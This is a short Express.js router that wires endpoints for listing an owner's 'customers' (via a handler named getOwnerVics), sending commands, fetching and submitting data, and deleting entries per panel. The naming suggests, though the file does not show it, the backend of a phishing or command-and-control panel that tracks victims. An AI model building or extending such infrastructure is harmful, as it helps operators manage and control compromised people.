const express = require("express");
const {
	getOwnerVics,
	command,
	getInfo,
	submitData,
	deleteEntry,
} = require("../controllers/panelController");

const router = express.Router();

router.get("/:panelName/customers/:owner", getOwnerVics);
router.post("/:panelName/command", command);
router.get("/:panelName/customers/id/:uniqueid", getInfo);
router.post("/:panelName/data", submitData);
router.post("/:panelName/delete", deleteEntry);

module.exports = router;
